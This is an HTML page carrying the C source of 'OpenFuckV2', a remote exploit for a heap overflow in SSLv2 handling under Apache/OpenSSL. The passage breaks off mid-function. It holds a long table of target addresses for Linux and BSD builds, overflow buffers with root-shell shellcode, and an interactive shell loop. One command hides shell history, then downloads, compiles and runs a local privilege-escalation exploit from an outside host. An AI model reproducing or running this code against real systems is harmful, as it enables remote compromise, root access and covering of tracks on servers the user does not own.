<html><head><title>Apache OpenSSL Remote Exploit (Multiple Targets) (OpenFuckV2.c)</title></head><pre>/*
 * OF version r00t VERY PRIV8 spabam
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
 * #hackarena irc.brasnet.org
 */

#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#include &lt;openssl/ssl.h&gt;
#include &lt;openssl/rsa.h&gt;
#include &lt;openssl/x509.h&gt;
#include &lt;openssl/evp.h&gt;

/* update this if you add architectures */
#define MAX_ARCH 138

struct archs {
	char* desc;
	int func_addr;	/* objdump -R /usr/sbin/httpd | grep free */
} architectures[] = {

        {
                &quot;Caldera OpenLinux (apache-1.3.26)&quot;,
                0x080920e0
        },
	{
		&quot;Cobalt Sun 6.0 (apache-1.3.12)&quot;,
		0x8120f0c
	},
	{
		&quot;Cobalt Sun 6.0 (apache-1.3.20)&quot;,
		0x811dcb8
	},
	{
		&quot;Cobalt Sun x (apache-1.3.26)&quot;,
		0x8123ac3
	},
	{
		&quot;Cobalt Sun x Fixed2 (apache-1.3.26)&quot;,
		0x81233c3
	},
	{
		&quot;Conectiva 4 (apache-1.3.6)&quot;,
		0x08075398
	},
	{
		&quot;Conectiva 4.1 (apache-1.3.9)&quot;,
		0x0808f2fe
	},
	{
		&quot;Conectiva 6 (apache-1.3.14)&quot;,
		0x0809222c
	},
	{
		&quot;Conectiva 7 (apache-1.3.12)&quot;,
		0x0808f874
	},
	{
		&quot;Conectiva 7 (apache-1.3.19)&quot;,
		0x08088aa0
	},
	{
		&quot;Conectiva 7/8 (apache-1.3.26)&quot;,
		0x0808e628
	},
	{
		&quot;Conectiva 8 (apache-1.3.22)&quot;,
		0x0808b2d0
	},
	{
		&quot;Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)&quot;,
		0x08095264
	},
	{
		&quot;Debian GNU Linux (apache_1.3.19-1)&quot;,
		0x080966fc
	},
	{
		&quot;Debian GNU Linux (apache_1.3.22-2)&quot;,
		0x08096aac
	},
	{
		&quot;Debian GNU Linux (apache-1.3.22-2.1)&quot;,
		0x08083828
	},
	{
		&quot;Debian GNU Linux (apache-1.3.22-5)&quot;,
		0x08083728
	},
	{
		&quot;Debian GNU Linux (apache_1.3.23-1)&quot;,
		0x08085de8
	},
	{
		&quot;Debian GNU Linux (apache_1.3.24-2.1)&quot;,
		0x08087d08
	},
        {       &quot;Debian Linux GNU Linux 2 (apache_1.3.24-2.1)&quot;,
	        0x080873ac
	},
	{
		&quot;Debian GNU Linux (apache_1.3.24-3)&quot;,
		0x08087d68
	},
	{
		&quot;Debian GNU Linux (apache-1.3.26-1)&quot;,
		0x0080863c4
	},
	{
		&quot;Debian GNU Linux 3.0 Woody (apache-1.3.26-1)&quot;,
		0x080863cc
	},
	{       &quot;Debian GNU Linux (apache-1.3.27)&quot;,
	        0x0080866a3
	},


{ &quot;FreeBSD (apache-1.3.9)&quot;, 0xbfbfde00 },
{ &quot;FreeBSD (apache-1.3.11)&quot;, 0x080a2ea8 },
{ &quot;FreeBSD (apache-1.3.12.1.40)&quot;, 0x080a7f58 },
{ &quot;FreeBSD (apache-1.3.12.1.40)&quot;, 0x080a0ec0 },
{ &quot;FreeBSD (apache-1.3.12.1.40)&quot;, 0x080a7e7c },
{ &quot;FreeBSD (apache-1.3.12.1.40_1)&quot;, 0x080a7f18 },
{ &quot;FreeBSD (apache-1.3.12)&quot;, 0x0809bd7c },
{ &quot;FreeBSD (apache-1.3.14)&quot;, 0xbfbfdc00 },
{ &quot;FreeBSD (apache-1.3.14)&quot;, 0x080ab68c },
{ &quot;FreeBSD (apache-1.3.14)&quot;, 0x0808c76c },
{ &quot;FreeBSD (apache-1.3.14)&quot;, 0x080a3fc8 },
{ &quot;FreeBSD (apache-1.3.14)&quot;, 0x080ab6d8 },
{ &quot;FreeBSD (apache-1.3.17_1)&quot;, 0x0808820c },
{ &quot;FreeBSD (apache-1.3.19)&quot;, 0xbfbfdc00 },
{ &quot;FreeBSD (apache-1.3.19_1)&quot;, 0x0808c96c },
{ &quot;FreeBSD (apache-1.3.20)&quot;, 0x0808cb70 },
{ &quot;FreeBSD (apache-1.3.20)&quot;, 0xbfbfc000 },
{ &quot;FreeBSD (apache-1.3.20+2.8.4)&quot;, 0x0808faf8 },
{ &quot;FreeBSD (apache-1.3.20_1)&quot;, 0x0808dfb4 },
{ &quot;FreeBSD (apache-1.3.22)&quot;, 0xbfbfc000 },
{ &quot;FreeBSD (apache-1.3.22_7)&quot;, 0x0808d110 },
{ &quot;FreeBSD (apache_fp-1.3.23)&quot;, 0x0807c5f8 },
{ &quot;FreeBSD (apache-1.3.24_7)&quot;, 0x0808f8b0 },
{ &quot;FreeBSD (apache-1.3.24+2.8.8)&quot;, 0x080927f8 },
{ &quot;FreeBSD 4.6.2-Release-p6 (apache-1.3.26)&quot;, 0x080c432c },
{ &quot;FreeBSD 4.6-Realease (apache-1.3.26)&quot;, 0x0808fdec },
{ &quot;FreeBSD (apache-1.3.27)&quot;, 0x080902e4 },


	{
		&quot;Gentoo Linux (apache-1.3.24-r2)&quot;,
		0x08086c34
	},
	{
		&quot;Linux Generic (apache-1.3.14)&quot;,
		0xbffff500
	},
	{
		&quot;Mandrake Linux X.x (apache-1.3.22-10.1mdk)&quot;,
		0x080808ab
	},
	{
		&quot;Mandrake Linux 7.1 (apache-1.3.14-2)&quot;,
		0x0809f6c4
	},
	{
		&quot;Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)&quot;,
		0x0809d233
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.14-2mdk)&quot;,
		0x0809f6ef
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.14) 2&quot;,
		0x0809d6c4
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)&quot;,
		0x0809ccde
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)&quot;,
		0x0809ce14
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)&quot;,
		0x0809d262
	},
	{
		&quot;Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)&quot;,
		0x08083545
	},
	{
		&quot;Mandrake Linux 8.0 (apache-1.3.19-3)&quot;,
		0x0809ea98
	},
	{
		&quot;Mandrake Linux 8.1 (apache-1.3.20-3)&quot;,
		0x0809e97c
	},
	{
		&quot;Mandrake Linux 8.2 (apache-1.3.23-4)&quot;,
		0x08086580
	},
	{       &quot;Mandrake Linux 8.2 #2 (apache-1.3.23-4)&quot;,
	        0x08086484
	},
	{       &quot;Mandrake Linux 8.2 (apache-1.3.24)&quot;,
	        0x08086665
	},

	{       &quot;Mandrake Linux 9 (apache-1.3.26)&quot;,
	        0x0808b864
	},
	{
		&quot;RedHat Linux ?.? GENERIC (apache-1.3.12-1)&quot;,
		0x0808c0f4
	},
	{
		&quot;RedHat Linux TEST1 (apache-1.3.12-1)&quot;,
		0x0808c0f4
	},
	{
		&quot;RedHat Linux TEST2 (apache-1.3.12-1)&quot;,
		0x0808c0f4
	},
	{
		&quot;RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)&quot;,
		0x080d2c35
	},
	{
		&quot;RedHat Linux 4.2 (apache-1.1.3-3)&quot;,
		0x08065bae
	},
	{
		&quot;RedHat Linux 5.0 (apache-1.2.4-4)&quot;,
		0x0808c82c
	},
	{
		&quot;RedHat Linux 5.1-Update (apache-1.2.6)&quot;,
		0x08092a45
	},
	{
		&quot;RedHat Linux 5.1 (apache-1.2.6-4)&quot;,
		0x08092c2d
	},
	{
		&quot;RedHat Linux 5.2 (apache-1.3.3-1)&quot;,
		0x0806f049
	},
	{
		&quot;RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)&quot;,
		0x0808e4d8
	},
	{
		&quot;RedHat Linux 6.0 (apache-1.3.6-7)&quot;,
		0x080707ec
	},
	{
		&quot;RedHat Linux 6.0 (apache-1.3.6-7)&quot;,
		0x080707f9
	},
	{
		&quot;RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)&quot;,
		0x0808fd52
	},
	{
		&quot;RedHat Linux 6.0 Update (apache-1.3.24)&quot;,
		0x80acd58
	},
	{
		&quot;RedHat Linux 6.1 (apache-1.3.9-4)1&quot;,
		0x0808ccc4
	},
	{
		&quot;RedHat Linux 6.1 (apache-1.3.9-4)2&quot;,
		0x0808ccdc
	},
	{
		&quot;RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)&quot;,
		0x0808fd5d
	},
	{
		&quot;RedHat Linux 6.1-fp2000 (apache-1.3.26)&quot;,
		0x082e6fcd
	},
	{
		&quot;RedHat Linux 6.2 (apache-1.3.12-2)1&quot;,
		0x0808f689
	},
	{
		&quot;RedHat Linux 6.2 (apache-1.3.12-2)2&quot;,
		0x0808f614
	},
	{
		&quot;RedHat Linux 6.2 mod(apache-1.3.12-2)3&quot;,
		0xbffff94c
	},

	{
		&quot;RedHat Linux 6.2 update (apache-1.3.22-5.6)1&quot;,
		0x0808f9ec
	},
	{
		&quot;RedHat Linux 6.2-Update (apache-1.3.22-5.6)2&quot;,
		0x0808f9d4
	},
	{
		&quot;Redhat Linux 7.x (apache-1.3.22)&quot;,
		0x0808400c
	},
	{
		&quot;RedHat Linux 7.x (apache-1.3.26-1)&quot;,
		0x080873bc
	},
	{       &quot;RedHat Linux 7.x (apache-1.3.27)&quot;,
	        0x08087221
	},
	{
		&quot;RedHat Linux 7.0 (apache-1.3.12-25)1&quot;,
		0x0809251c
	},
	{
		&quot;RedHat Linux 7.0 (apache-1.3.12-25)2&quot;,
		0x0809252d
	},
	{
		&quot;RedHat Linux 7.0 (apache-1.3.14-2)&quot;,
		0x08092b98
	},
        {
		&quot;RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)&quot;,
		0x08084358
	},
	{
		&quot;RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)&quot;,
		0x0808438c
	},
	{
		&quot;RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)&quot;,
		0x08086e41
	},
	{
		&quot;RedHat Linux 7.1 (apache-1.3.19-5)1&quot;,
		0x0809af8c
	},
	{
		&quot;RedHat Linux 7.1 (apache-1.3.19-5)2&quot;,
		0x0809afd9
	},
	{
		&quot;RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)&quot;,
		0x0808438c
	},
	{
		&quot;RedHat Linux 7.1-Update (1.3.22-5.7.1)&quot;,
		0x08084389
	},
        {
		&quot;RedHat Linux 7.1 (apache-1.3.22-src)&quot;,
	        0x0816021c
        },
        {
		&quot;RedHat Linux 7.1-Update (1.3.27-1.7.1)&quot;,
		0x08086ec89
	},
	{
		&quot;RedHat Linux 7.2 (apache-1.3.20-16)1&quot;,
		0x080994e5
	},
	{
		&quot;RedHat Linux 7.2 (apache-1.3.20-16)2&quot;,
		0x080994d4
	},
	{
		&quot;RedHat Linux 7.2-Update (apache-1.3.22-6)&quot;,
		0x08084045
	},
	{
		&quot;RedHat Linux 7.2 (apache-1.3.24)&quot;,
		0x80b0938
	},
	{
		&quot;RedHat Linux 7.2 (apache-1.3.26)&quot;,
		0x08161c16
	},
	{
		&quot;RedHat Linux 7.2 (apache-1.3.26-snc)&quot;,
		0x8161c14
	},
	{

		&quot;Redhat Linux 7.2 (apache-1.3.26 w/PHP)1&quot;,
		0x08269950
	},
	{
		&quot;Redhat Linux 7.2 (apache-1.3.26 w/PHP)2&quot;,
		0x08269988
	},
	{
		&quot;RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)&quot;,
		0x08086af9
	},
	{
		&quot;RedHat Linux 7.3 (apache-1.3.23-11)1&quot;,
		0x0808528c
	},
	{
		&quot;RedHat Linux 7.3 (apache-1.3.23-11)2&quot;,
		0x0808525f
	},
	{
		&quot;RedHat Linux 7.3 (apache-1.3.27)&quot;,
		0x080862e4
	},
	{       &quot;RedHat Linux 8.0 (apache-1.3.27)&quot;,
	        0x08084c1c
        },
        {       &quot;RedHat Linux 8.0-second (apache-1.3.27)&quot;,
                0x0808151e
        },
	{       &quot;RedHat Linux 8.0 (apache-2.0.40)&quot;,
                0x08092fa4
        },
	{
		&quot;Slackware Linux 4.0 (apache-1.3.6)&quot;,
		0x08088130
	},
	{
		&quot;Slackware Linux 7.0 (apache-1.3.9)&quot;,
		0x080a7fc0
	},
	{
		&quot;Slackware Linux 7.0 (apache-1.3.26)&quot;,
		0x083d37fc
	},
        {       &quot;Slackware 7.0  (apache-1.3.26)2&quot;,
		0x083d2232
	},
	{
		&quot;Slackware Linux 7.1 (apache-1.3.12)&quot;,
		0x080a86a4
	},
	{
		&quot;Slackware Linux 8.0 (apache-1.3.20)&quot;,
		0x080ae67c
	},
	{
		&quot;Slackware Linux 8.1 (apache-1.3.24)&quot;,
		0x080b0c60
	},
	{
		&quot;Slackware Linux 8.1 (apache-1.3.26)&quot;,
		0x080b2100
	},

	{
		&quot;Slackware Linux 8.1-stable (apache-1.3.26)&quot;,
		0x080b0c60
	},
	{       &quot;Slackware Linux (apache-1.3.27)&quot;,
	        0x080b1a3a
	},
	{
		&quot;SuSE Linux 7.0 (apache-1.3.12)&quot;,
		0x0809f54c
	},
	{
		&quot;SuSE Linux 7.1 (apache-1.3.17)&quot;,
		0x08099984
	},
	{
		&quot;SuSE Linux 7.2 (apache-1.3.19)&quot;,
		0x08099ec8
	},
	{
		&quot;SuSE Linux 7.3 (apache-1.3.20)&quot;,
		0x08099da8
	},
	{
		&quot;SuSE Linux 8.0 (apache-1.3.23)&quot;,
		0x08086168
	},
	{
		&quot;SUSE Linux 8.0 (apache-1.3.23-120)&quot;,
		0x080861c8
	},
	{
		&quot;SuSE Linux 8.0 (apache-1.3.23-137)&quot;,
		0x080861c8
	},
/* this one unchecked cause require differend shellcode */
	{
		&quot;Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)&quot;,
		0xfd42630
	},

};

extern int errno;

int cipher;
int ciphers;

/* the offset of the local port from be beginning of the overwrite next chunk buffer */
#define FINDSCKPORTOFS     208 + 12 + 46

unsigned char overwrite_session_id_length[] =
	&quot;AAAA&quot;								/* int master key length; */
	&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];	*/
	&quot;\x70\x00\x00\x00&quot;;					/* unsigned int session id length; */

unsigned char overwrite_next_chunk[] =
	&quot;AAAA&quot;								/* int master key length; */
	&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];	*/
	&quot;AAAA&quot;								/* unsigned int session id length; */
	&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;	/* unsigned char session id[SSL MAX SSL SESSION ID LENGTH]; */
	&quot;AAAA&quot;								/* unsigned int sid ctx length; */
	&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;	/* unsigned char sid ctx[SSL MAX SID CTX LENGTH]; */
	&quot;AAAA&quot;								/* int not resumable; */
	&quot;\x00\x00\x00\x00&quot;					/* struct sess cert st *sess cert; */
	&quot;\x00\x00\x00\x00&quot;					/* X509 *peer; */
	&quot;AAAA&quot;								/* long verify result; */
	&quot;\x01\x00\x00\x00&quot;					/* int references; */
	&quot;AAAA&quot;								/* int timeout; */
	&quot;AAAA&quot;								/* int time */
	&quot;AAAA&quot;								/* int compress meth; */
	&quot;\x00\x00\x00\x00&quot;					/* SSL CIPHER *cipher; */
	&quot;AAAA&quot;								/* unsigned long cipher id; */
	&quot;\x00\x00\x00\x00&quot;					/* STACK OF(SSL CIPHER) *ciphers; */
	&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;	/* CRYPTO EX DATA ex data; */
	&quot;AAAAAAAA&quot;							/* struct ssl session st *prev,*next; */

	&quot;\x00\x00\x00\x00&quot;					/* Size of previous chunk */
	&quot;\x11\x00\x00\x00&quot;					/* Size of chunk, in bytes */
	&quot;fdfd&quot;								/* Forward and back pointers */
	&quot;bkbk&quot;
	&quot;\x10\x00\x00\x00&quot;					/* Size of previous chunk */
	&quot;\x10\x00\x00\x00&quot;					/* Size of chunk, PREV INUSE is set */

/* shellcode start */
    &quot;\xeb\x0a\x90\x90&quot;	/* jump 10 bytes ahead, land at shellcode */
    &quot;\x90\x90\x90\x90&quot;
    &quot;\x90\x90\x90\x90&quot;	/* this is overwritten with FD by the unlink macro */

/* 72 bytes findsckcode by LSD-pl */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x89\xe7&quot;             /* movl    %esp,%edi              */
    &quot;\x8d\x77\x10&quot;         /* leal    0x10(%edi),%esi        */
    &quot;\x89\x77\x04&quot;         /* movl    %esi,0x4(%edi)         */
    &quot;\x8d\x4f\x20&quot;         /* leal    0x20(%edi),%ecx        */
    &quot;\x89\x4f\x08&quot;         /* movl    %ecx,0x8(%edi)         */
    &quot;\xb3\x10&quot;             /* movb    $0x10,%bl              */
    &quot;\x89\x19&quot;             /* movl    %ebx,(%ecx)            */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\xff&quot;             /* movb    $0xff,%cl              */
    &quot;\x89\x0f&quot;             /* movl    %ecx,(%edi)            */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x66&quot;             /* movb    $0x66,%al              */
    &quot;\xb3\x07&quot;             /* movb    $0x07,%bl              */
    &quot;\x89\xf9&quot;             /* movl    %edi,%ecx              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x39\xd8&quot;             /* cmpl    %ebx,%eax              */
    &quot;\x75\x0a&quot;             /* jne     &lt;findsckcode+54&gt;       */
    &quot;\x66\xb8\x12\x34&quot;     /* movw    $0x1234,%bx            */
    &quot;\x66\x39\x46\x02&quot;     /* cmpw    %bx,0x2(%esi)          */
    &quot;\x74\x02&quot;             /* je      &lt;findsckcode+56&gt;       */
    &quot;\xe2\xe0&quot;             /* loop    &lt;findsckcode+24&gt;       */
    &quot;\x89\xcb&quot;             /* movl    %ecx,%ebx              */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\x03&quot;             /* movb    $0x03,%cl              */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x3f&quot;             /* movb    $0x3f,%al              */
    &quot;\x49&quot;                 /* decl    %ecx                   */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x41&quot;                 /* incl    %ecx                   */
    &quot;\xe2\xf6&quot;             /* loop    &lt;findsckcode+62&gt;       */

/* 10 byte setresuid(0,0,0); by core */
     &quot;\x31\xc9&quot;       /* xor    %ecx,%ecx */
     &quot;\xf7\xe1&quot;       /* mul    %ecx,%eax */
     &quot;\x51&quot;           /* push   %ecx */
     &quot;\x5b&quot;           /* pop    %ebx */
     &quot;\xb0\xa4&quot;       /* mov    $0xa4,%al */
     &quot;\xcd\x80&quot;       /* int    $0x80 */

    
/* bigger shellcode added by spabam */

/* &quot;\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69&quot;
        &quot;\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80&quot;
*/


/* 24 bytes execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0); by LSD-pl */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x68&quot;&quot;//sh&quot;           /* pushl   $0x68732f2f            */
    &quot;\x68&quot;&quot;/bin&quot;           /* pushl   $0x6e69622f            */
    &quot;\x89\xe3&quot;             /* movl    %esp,%ebx              */
    &quot;\x50&quot;                 /* pushl   %eax                   */
    &quot;\x53&quot;                 /* pushl   %ebx                   */
    &quot;\x89\xe1&quot;             /* movl    %esp,%ecx              */
    &quot;\x99&quot;                 /* cdql                           */
    &quot;\xb0\x0b&quot;             /* movb    $0x0b,%al              */
    &quot;\xcd\x80&quot;;             /* int     $0x80                  */

/* read and write buffer*/
#define BUFSIZE 16384

/* hardcoded protocol stuff */
#define CHALLENGE_LENGTH 16
#define RC4_KEY_LENGTH 16	/* 128 bits */
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)

/* straight from the openssl source */
#define n2s(c,s)    ((s=(((unsigned int)(c[0]))&lt;&lt; 8)| (((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c)    ((c[0]=(unsigned char)(((s)&gt;&gt; 8)&amp;0xff), c[1]=(unsigned char)(((s)    )&amp;0xff)),c+=2)

/* we keep all SSL2 state in this structure */
typedef struct {
	int sock;

	/* client stuff */
	unsigned char challenge[CHALLENGE_LENGTH];
	unsigned char master_key[RC4_KEY_LENGTH];
	unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];

	/* connection id - returned by the server */
	int conn_id_length;
	unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];

	/* server certificate */
	X509 *x509;

	/* session keys */
	unsigned char* read_key;
	unsigned char* write_key;
	RC4_KEY* rc4_read_key;
	RC4_KEY* rc4_write_key;

	/* sequence numbers, used for MAC calculation */
	int read_seq;
	int write_seq;

	/* set to 1 when the SSL2 handshake is complete */
	int encrypted;
} ssl_conn;

#define COMMAND1 &quot;TERM=xterm; export TERM=xterm; exec bash -i\n&quot;
#define COMMAND2 &quot;unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n&quot;

long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) &lt; 0) {
		if ((he = gethostbyname(hostname)) == NULL) {
			perror(&quot;gethostbyname()&quot;);
			exit(-1);
		}
		memcpy(&amp;ipaddr, he-&gt;h_addr, he-&gt;h_length);
	}	
	return ipaddr;
}

/* mixter's code w/enhancements by core */

int sh(int sockfd) {
   char snd[1024], rcv[1024];
   fd_set rset;
   int maxfd, n;

   /* Priming commands */
   strcpy(snd, COMMAND1 &quot;\n&quot;);
   write(sockfd, snd, strlen(snd));

   strcpy(snd, COMMAND2 &quot;\n&quot;);
   write(sockfd, snd, strlen(snd));

   /* Main command loop */
   for (;;) {
      FD_SET(fileno(stdin), &amp;rset);
      FD_SET(sockfd, &amp;rset);

      maxfd = ( ( fileno(stdin) &gt; sockfd )?fileno(stdin):sockfd ) + 1;
      select(maxfd, &amp;rset, NULL, NULL, NULL);

      if (FD_ISSET(fileno(stdin), &amp;rset)) {
	 bzero(snd, sizeof(snd));
	 fgets(snd, sizeof(snd)-2, stdin);
	 write(sockfd, snd, strlen(snd));
      }

      if (FD_ISSET(sockfd, &amp;rset)) {
	 bzero(rcv, sizeof(rcv));

	 if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	    printf(&quot;Good Bye!\n&quot;);
	    return 0;
	 }

	 if (n &lt; 0) {
	    perror(&quot;read&quot;);
	    return 1;
	 }

	 fputs(rcv, stdout);
	 fflush(stdout); /* keeps output nice */
      }
   } /* for(;;) */
}

/* Returns the local port of a connected socket */
int get_local_port(int sock)
{
	struct sockaddr_in s_in;
	unsigned int namelen = sizeof(s_in);

	if (getsockname(sock, (struct sockaddr *)&amp;s_in, &amp;namelen) &lt; 0) {
		printf(&quot;Can't get local port: %s\n&quot;, strerror(errno));
		exit(1);
	}

	return s_in.sin_port;
}

/* Connect to a host */
int connect_host(char* host, int port)
{
	struct sockaddr_in s_in;
	int sock;

	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = getip(host);
	s_in.sin_port = htons(port);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt;= 0) {
		printf(&quot;Could not create a socket\n&quot;);
		exit(1);
	}

	if (connect(sock, (struct sockaddr *)&amp;s_in, sizeof(s_in)) &lt; 0) {
		printf(&quot;Connection to %s:%d failed: %s\n&quot;, host, port, strerror(errno));
		exit(1);
	}

	return sock;
}

/* Create a new ssl conn structure and connect to a host */
ssl_conn* ssl_connect_host(char* host, int port)
{
	ssl_conn* ssl;

	if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) {
		printf(&quot;Can't allocate memory\n&quot;);
		exit(1);
	}

	/* Initialize some values */
	ssl-&gt;encrypted = 0;
	ssl-&gt;write_seq = 0;
	ssl-&gt;read_seq = 0;

	ssl-&gt;sock = connect_host(host, port);

	return ssl;
}

/* global buffer used by the ssl result() */
char res_buf[30];

/* converts an SSL error code to a string */
char* ssl_error(int code) {
	switch (code) {
		case 0x00:	return &quot;SSL2 PE UNDEFINED ERROR (0x00)&quot;;
		case 0x01:	return &quot;SSL2 PE NO CIPHER (0x01)&quot;;
		case 0x02:	return &quot;SSL2 PE NO CERTIFICATE (0x02)&quot;;
		case 0x04:	return &quot;SSL2 PE BAD CERTIFICATE (0x03)&quot;;
		case 0x06:	return &quot;SSL2 PE UNSUPPORTED CERTIFICATE TYPE (0x06)&quot;;
	default:
		sprintf(res_buf, &quot;%02x&quot;, code);
		return res_buf;
	}
}

/* read len bytes from a socket. boring. */
int read_data(int sock, unsigned char* buf, int len)
{
	int l;
	int to_read = len;

	do {
		if ((l = read(sock, buf, to_read)) &lt; 0) {
			printf(&quot;Error in read: %s\n&quot;, strerror(errno));
			exit(1);
		}
		to_read -= len;
	} while (to_read &gt; 0);

	return len;
}

/* reads an SSL packet and decrypts it if necessery */
int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size)
{
	int rec_len, padding;

	read_data(ssl-&gt;sock, buf, 2);

	if ((buf[0] &amp; 0x80) == 0) {
		/* three byte header */
		rec_len = ((buf[0] &amp; 0x3f) &lt;&lt; 8) | buf[1];
		read_data(ssl-&gt;sock, &amp;buf[2], 1);
		padding = (int)buf[2];
	}
	else {
		/* two byte header */
		rec_len = ((buf[0] &amp; 0x7f) &lt;&lt; 8) | buf[1];
		padding = 0;
	}

	if ((rec_len &lt;= 0) || (rec_len &gt; buf_size)) {
		printf(&quot;read_ssl_packet: Record length out of range (rec_len = %d)\n&quot;, rec_len); 
		exit(1);
	}

	read_data(ssl-&gt;sock, buf, rec_len);

	if (ssl-&gt;encrypted) {
		if (MD5_DIGEST_LENGTH + padding &gt;= rec_len) {
			if ((buf[0] == SSL2_MT_ERROR) &amp;&amp; (rec_len == 3)) {
				/* the server didn't switch to encryption due to an error */
				return 0;
			}
			else {
				printf(&quot;read_ssl_packet: Encrypted message is too short (rec_len = %d)\n&quot;, rec_len);
				exit(1);
			}
		}

		/* decrypt the encrypted part of the packet */
		RC4(ssl-&gt;rc4_read_key, rec_len, buf, buf);

		/* move the decrypted message in the beginning of the buffer */
		rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
	}

	if (buf[0] == SSL2_MT_ERROR) {
		if (rec_len != 3) {
			printf(&quot;Malformed server error message\n&quot;);
			exit(1);
		}
		else {
			return 0;
		}
	}

	return rec_len;
}

/* send an ssl packet, encrypting it if ssl-&gt;encrypted is set */
void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len)
{
	unsigned char buf[BUFSIZE];
	unsigned char* p;
	int tot_len;
	MD5_CTX ctx;
	int seq;


	if (ssl-&gt;encrypted)
		tot_len = rec_len + MD5_DIGEST_LENGTH;	/* RC4 needs no padding */
	else
		tot_len = rec_len;

	if (2 + tot_len &gt; BUFSIZE) {
		printf(&quot;send_ssl_packet: Record length out of range (rec_len = %d)\n&quot;, rec_len);
		exit(1);
	}

	p = buf;
	s2n(tot_len, p);

	buf[0] = buf[0] | 0x80;	/* two byte header */

	if (ssl-&gt;encrypted) {
		/* calculate the MAC */
		seq = ntohl(ssl-&gt;write_seq);

		MD5_Init(&amp;ctx);
		MD5_Update(&amp;ctx, ssl-&gt;write_key, RC4_KEY_LENGTH);
		MD5_Update(&amp;ctx, rec, rec_len);
		MD5_Update(&amp;ctx, &amp;seq, 4);
		MD5_Final(p, &amp;ctx);

		p+=MD5_DIGEST_LENGTH;

		memcpy(p, rec, rec_len);

		/* encrypt the payload */
		RC4(ssl-&gt;rc4_write_key, tot_len, &amp;buf[2], &amp;buf[2]);

	}
	else {
		memcpy(p, rec, rec_len);
	}

	send(ssl-&gt;sock, buf, 2 + tot_len, 0);

	/* the sequence number is incremented by both encrypted and plaintext packets
*/
	ssl-&gt;write_seq++;
}

/* Send a CLIENT HELLO message to the server */
void send_client_hello(ssl_conn *ssl)
{
	int i;
	unsigned char buf[BUFSIZE] =
		&quot;\x01&quot;			/* client hello msg */

		&quot;\x00\x02&quot;		/* client version */
		&quot;\x00\x18&quot;		/* cipher specs length */
		&quot;\x00\x00&quot;		/* session id length */
		&quot;\x00\x10&quot;		/* challenge length */

		&quot;\x07\x00\xc0\x05\x00\x80\x03\x00&quot;	/* cipher specs data */
		&quot;\x80\x01\x00\x80\x08\x00\x80\x06&quot;
		&quot;\x00\x40\x04\x00\x80\x02\x00\x80&quot;

		&quot;&quot;;									/* session id data */

	/* generate CHALLENGE LENGTH bytes of challenge data */
